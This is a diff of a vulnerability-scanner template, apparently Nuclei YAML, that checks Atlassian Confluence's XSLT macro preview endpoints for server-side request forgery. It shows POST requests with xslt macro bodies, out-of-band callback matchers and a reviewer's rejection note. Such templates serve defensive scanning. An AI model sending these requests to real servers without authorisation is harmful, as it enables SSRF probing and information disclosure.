@@ -1,5 +1,4 @@
 id: confluence-xslt-macro-ssrf
-
 info:
   name: Atlassian Confluence XSLT Macro - Server-Side Request Forgery
   author: ritikchaddha
@@ -12,27 +11,18 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 6.5
     cve-id: CVE-2024-29415
-    cwe-id: CWE-918
+    cwe-id: CWE-611,CWE-918
   metadata:
-    verified: true
-    max-request: 2
-    vendor: atlassian
-    product: confluence
+    runzero-review: REJECT/2026-01-30/uses interactsh
     fofa-query: icon_hash="-305179312"
-  tags: cve,cve2024,confluence,atlassian,ssrf,xslt,macro
-
+    max-request: 2
+    product: confluence
+    vendor: atlassian
+    verified: true
+  tags: atlassian,confluence,cve,cve2024,macro,ssrf,xslt
 flow: http(1) || http(2)
-
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/rest/tinymce/1/macro/preview"
-      - "{{BaseURL}}/rest/api/content/macro/preview"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
+  - body: |
       {
         "macro": {
           "name": "xslt",
@@ -42,24 +32,20 @@ http:
           }
         }
       }
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body, "contextConfigLocation")'
-          - 'contains(interactsh_protocol, "http")'
-          - 'status_code == 200'
-        condition: and
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/rest/tinymce/1/macro/preview"
-      - "{{BaseURL}}/rest/api/content/macro/preview"
-
     headers:
       Content-Type: application/json
-
-    body: |
+    matchers:
+      - condition: and
+        dsl:
+          - contains(body, "contextConfigLocation")
+          - contains(interactsh_protocol, "http")
+          - status_code == 200
+        type: dsl
+    method: POST
+    path:
+      - '{{BaseURL}}/rest/tinymce/1/macro/preview'
+      - '{{BaseURL}}/rest/api/content/macro/preview'
+  - body: |
       {
         "macro": {
           "name": "xslt",
@@ -70,12 +56,16 @@ http:
           }
         }
       }
-
+    headers:
+      Content-Type: application/json
     matchers:
-      - type: dsl
+      - condition: and
         dsl:
-          - 'contains(body, "contextConfigLocation")'
-          - 'contains(interactsh_protocol, "http")'
-          - 'status_code == 200'
-        condition: and
-# digest: 4b0a00483046022100a01f44a3fa80506bcd82e2bf8a9f3a9d1060145a50d66e64a05854f2b133ebb2022100efedb50143346b1d5157a29fa3a3a94c16fb8eb6821b297e741e617a3c52b893:922c64590222798bb761d5b6d8e72950
+          - contains(body, "contextConfigLocation")
+          - contains(interactsh_protocol, "http")
+          - status_code == 200
+        type: dsl
+    method: POST
+    path:
+      - '{{BaseURL}}/rest/tinymce/1/macro/preview'
+      - '{{BaseURL}}/rest/api/content/macro/preview'
